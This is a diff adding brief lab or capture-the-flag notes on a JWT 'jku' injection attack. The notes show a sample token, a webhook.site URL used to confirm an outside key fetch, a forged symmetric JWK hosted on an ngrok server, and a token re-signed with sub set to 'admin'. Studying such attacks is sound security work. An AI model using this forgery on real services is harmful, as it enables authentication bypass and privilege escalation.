@@ -1,0 +1,40 @@
+l3ol3o
+
+eyJraWQiOiJIUzI1NiIsImFsZyI6IkhTMjU2In0.eyJqa3UiOiJodHRwOi8vbG9jYWxob3N0OjgwODAvc2VjcmV0IiwiZXhwIjoxNjE3NjI0MDQ1LCJqdGkiOiJRVnRkaUNycnFHbGxEQlpiTXpad1p3IiwiaWF0IjoxNjE3MDE5MjQ1LCJuYmYiOjE2MTcwMTkxMjUsInN1YiI6Imwzb2wzbyJ9.XyR_C3uQshqG2-XHM77wH6vmqyqazlSWOJyvvA19MhM
+
+jku in payload
+```
+{
+  "kid": "HS256",
+  "alg": "HS256"
+}
+{
+  "jku": "http://localhost:8080/secret",
+  "exp": 1617624045,
+  "jti": "QVtdiCrrqGllDBZbMzZwZw",
+  "iat": 1617019245,
+  "nbf": 1617019125,
+  "sub": "l3ol3o"
+}
+```
+
+
+Change to
+	"jku": "https://webhook.site/c7c327b2-81ef-4267-880f-be92a5b57387"
+and paste it => error, but fetched
+
+Change jku back, and gives "kid" random string => error
+  JWT processing failed. Additional details: [[17] Unable to process JOSE object (cause: org.jose4j.lang.UnresolvableKeyException: Unable to find a suitable verification key for JWS w/ header {"kid":"HS2d56","alg":"HS256"} from JWKs [org.jose4j.jwk.OctetSequenceJsonWebKey{kty=oct, kid=HS256, alg=HS256}] obtained from http://localhost:8080/secret): JsonWebSignature{"kid":"HS2d56","alg":"HS256"}
+
+We know the kty=oct
+
+Create a file secret on my server
+```
+{"kty": "oct", "use": "sig", "kid": "HS256", "alg": "HS256", "k": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
+```
+
+Change to
+	"jku": "http://1fa00ed6dbb2.ngrok.io/secret"
+	"sub": "admin"
+
+and sign with secret key "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", check the box "secret base64 encoded"
